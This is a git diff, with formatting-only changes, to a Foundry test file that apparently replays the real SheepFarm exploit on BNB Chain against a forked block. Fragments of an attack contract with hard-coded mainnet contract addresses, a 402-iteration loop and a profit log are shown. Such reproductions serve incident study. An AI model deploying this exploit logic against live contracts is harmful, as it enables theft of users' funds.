@@ -8,6 +8,7 @@ import "forge-std/Test.sol";
 // Tx: https://bscscan.com/tx/0x8b3e0e3ea04829f941ca24c85032c3b4aeb1f8b1b278262901c2c5847dc72f1c
 
 interface ISheepFarm {
+
     function register(address neighbor) external;
 
     function addGems() external payable;
@@ -17,9 +18,11 @@ interface ISheepFarm {
     function sellVillage() external;
 
     function withdrawMoney(uint256 wool) external;
+
 }
 
 contract ContractTest is Test {
+
     function setUp() public {
         vm.createSelectFork("bsc", 23_089_184);
     }
@@ -34,20 +37,18 @@ contract ContractTest is Test {
         uint256 afterBalance = address(this).balance;
 
         emit log_named_decimal_uint(
-            "SheepFarm exploiter profit after attack (in BNB):",
-            afterBalance - beforeBalance,
-            18
+            "SheepFarm exploiter profit after attack (in BNB):", afterBalance - beforeBalance, 18
         );
     }
 
     receive() external payable {}
+
 }
 
 contract AttackContract {
-    ISheepFarm public constant Farm =
-        ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
-    address public constant neighbor =
-        0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
+
+    ISheepFarm public constant Farm = ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
+    address public constant neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
 
     constructor() payable {
         for (uint256 i; i < 402; ++i) {
@@ -68,4 +69,5 @@ contract AttackContract {
     }
 
     receive() external payable {}
+
 }
